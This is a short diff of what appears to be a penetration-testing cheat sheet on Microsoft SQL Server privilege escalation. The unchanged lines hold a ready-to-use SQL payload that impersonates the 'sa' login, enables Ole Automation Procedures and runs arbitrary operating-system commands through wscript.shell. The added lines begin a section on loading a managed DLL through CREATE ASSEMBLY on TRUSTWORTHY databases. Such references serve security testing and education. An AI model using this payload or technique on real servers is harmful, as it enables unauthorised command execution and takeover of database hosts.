@@ -45,3 +45,10 @@ aslogin
 ```sql
 EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"'"
 ```
+
+<br><br>
+
+## Custom assemblies 
+
+**If a database has the TRUSTWORTHY property set, it's possible to use the CREATE ASSEMBLY statement to import a managed DLL as an object inside the SQL server and execute methods within it**
+
